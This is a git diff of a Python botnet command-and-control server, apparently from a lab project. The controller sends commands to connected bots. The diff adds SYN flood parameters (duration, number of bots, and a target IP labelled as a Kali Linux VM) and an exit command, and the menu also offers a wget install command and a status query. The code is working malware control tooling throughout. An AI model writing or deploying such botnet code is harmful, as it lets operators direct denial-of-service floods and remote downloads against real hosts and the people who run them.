@@ -1,6 +1,7 @@
 import socket
 import threading
 
+TARGET = '192.168.56.105'#IP Address of Kali Linux target VM
 
 def connectbot(clientsocketsource):
 	while True:
@@ -11,19 +12,25 @@ def connectbot(clientsocketsource):
 def sendcommands(clientsocketsaddresssource):
 	while True:
 		print("Choose the type of command to execute ")
-		print("1) SYN Flood\n 2) Install content using wget \n 3) Get status of bot")
+		print("1) SYN Flood\n 2) Install content using wget \n 3) Get status of bot \n 4) Exit server")
 
 		input_get = raw_input()
 		for row in clientsocketsaddresssource:
 			if int(input_get) == 1:
-				row.send("SYN Flood")
+				duration = raw_input("Enter the duration of the attack in seconds: ")
+				numberofbots = raw_input("Enter the number of bots to send this to: ")
+				command = "\t".join(("SYN FLOOD", str(duration), str(numberofbots), TARGET))
+				row.send(command)
 
 			if int(input_get) == 2:
 				row.send("WGET")
 
 			if int(input_get) == 3:
-				print('in here')
 				row.send("STATUS")
+
+			if int(input_get) == 4:
+				row.send("EXIT")
+				break
 
 
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
